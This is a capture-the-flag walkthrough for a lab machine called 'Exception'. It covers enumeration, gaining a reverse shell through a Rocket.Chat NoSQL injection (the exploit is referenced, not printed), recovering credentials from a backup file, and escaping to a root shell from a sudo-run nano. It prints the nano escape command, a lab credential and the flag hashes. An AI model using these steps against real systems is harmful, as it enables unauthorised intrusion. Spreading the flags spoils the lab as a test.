+++
title = "Exception - Walkthrough"
date = "2026-08-17"
author = "nvru"
description = "Walkthrough for the Exception machine."
tags = [
    "ctf",
    "walkthrough",
    "linux",
    "apache",
    "rocket.chat",
    "docker",
    "nosql-injection",
    "cve",
    "sudo",
    "privilege-escalation",
    "medium",
]
draft = false
+++

## Overview

- **Platform:** HackSmarter
- **Difficulty:** `Medium`
- **OS:** `Linux`
- **Attacker IP:** `10.200.82.89`
- **Target IP:** `10.0.25.103`

The objective was to enumerate the target, identify the exposed attack surface, obtain initial access, and escalate privileges to root.

---

## Enumeration

### Port Scanning

#### RustScan

```bash
rustscan -a 10.0.25.103 -- -sC -sV -A -oA nmap/rust
```

#### Results

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
3000/tcp open  http    Rocket.Chat
```

The scan revealed three exposed services:

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 9.6p1 |
| 80   | HTTP    | Apache 2.4.58 |
| 3000 | HTTP    | Rocket.Chat   |

The web services appeared to be the primary attack surface.

---

### HTTP (Port 80)

Browsing the web server displayed a simple AI prompt page.

![Homepage](/images/hsm/exception/http_80.png)

The `robots.txt` file contained no useful information.

![robots.txt](/images/hsm/exception/robots_80.png)

I also performed directory brute forcing.

```bash
gobuster dir \
-u http://10.0.25.103 \
-w /opt/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
-x html,php,xml,js,bak,txt
```

No interesting directories or files were discovered, so I moved on to the service running on port **3000**.

---

### HTTP (Port 3000)

Port **3000** was running a **Rocket.Chat** instance.

![Rocket.Chat](/images/hsm/exception/rocket_app.png)

I found the project on GitHub to better understand the application.

- https://github.com/RocketChat/Rocket.Chat

Registration was enabled, allowing me to create an account and log in.

![Login](/images/hsm/exception/login.png)

While browsing the application I discovered the administrator email address.

![Admin Email](/images/hsm/exception/admin_email.png)

After searching for known vulnerabilities affecting Rocket.Chat, I found a NoSQL Injection vulnerability capable of leading to remote code execution.

Reference:

- https://www.sonarsource.com/blog/nosql-injections-in-rocket-chat/

Exploiting the vulnerability successfully provided a reverse shell as the **rocketchat** user.

![Reverse Shell](/images/hsm/exception/rev_shell.png)

---

## Initial Access

Initial access was obtained as the **rocketchat** user through the Rocket.Chat NoSQL Injection vulnerability.

---

## Post-Exploitation

After obtaining a shell I performed local enumeration.

There was nothing particularly interesting inside the Rocket.Chat user's home directory.

The system did not have **sudo** installed, which was unusual.

Checking the network configuration revealed the familiar Docker subnet.

```bash
hostname -I
```

![Docker Network](/images/hsm/exception/sudo_hostname.png)

To confirm my suspicion I inspected the root filesystem.

The presence of `.dockerenv` confirmed the application was running inside a Docker container.

While enumerating the filesystem I also discovered a file named `Backup_db.txt`.

![Backup File](/images/hsm/exception/dockerenv_backupdb.png)

Inspecting the file revealed credentials for the user **Ron**.

![Credentials](/images/hsm/exception/backup_creds.png)

Using the recovered credentials over SSH successfully provided access to the host.

```bash
ssh Ron@10.0.25.103
```

![SSH](/images/hsm/exception/ssh_Ron.png)

---

## Privilege Escalation

Checking sudo permissions revealed an interesting entry.

```bash
sudo -l
```

Ron could execute the following command as root without a password.

```text
/opt/log_inspector/check_log --clean
```

![Sudo Permissions](/images/hsm/exception/Ron_sudo.png)

I inspected the binary.

```bash
file /opt/log_inspector/check_log
```

The binary was not stripped.

![Binary Information](/images/hsm/exception/not_stripped.png)

Running `strings` revealed that the program executed several common utilities including `cat`, `wc`, and `nano`.

```bash
strings /opt/log_inspector/check_log
```

![Strings](/images/hsm/exception/strings_progr.png)

Executing the allowed command confirmed that it simply launched **nano** with root privileges.

```bash
sudo -u root /opt/log_inspector/check_log --clean
```

![Nano](/images/hsm/exception/open_nanao.png)

Since Nano was running as root, escaping to a shell was straightforward.

Press **Ctrl+T** and execute:

```bash
reset ; /bin/bash 1>&0 2>&0
```

A root shell was obtained successfully.

![Root Shell](/images/hsm/exception/exploit_nanao.png)

---

## Root

I verified the obtained privileges.

```bash
id
whoami
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

![Root](/images/hsm/exception/root.png)

The machine was successfully compromised.

---

## Credentials

```text
Ron:AtentiouSenoU
```

---

## Flags

### User

```text
f27d79d10bd6de94d76004bb3ad3663a
```

### Root

```text
9443f7f474d5270c2e104bb1002118d523
```

---

## Attack Path

```text
Port Scan
    ↓
Web Enumeration
    ↓
Rocket.Chat Discovery
    ↓
NoSQL Injection (Rocket.Chat)
    ↓
Remote Code Execution
    ↓
Docker Enumeration
    ↓
Sensitive Data Exposure (Backup_db.txt)
    ↓
SSH Access (Ron)
    ↓
Misconfigured sudo Rule
    ↓
Root Nano Shell Escape
    ↓
Root
```

---

## References

- [Rocket.Chat GitHub](https://github.com/RocketChat/Rocket.Chat)
- [SonarSource – NoSQL Injections in Rocket.Chat](https://www.sonarsource.com/blog/nosql-injections-in-rocket-chat/)
- [GTFOBins – Nano](https://gtfobins.github.io/gtfobins/nano/)
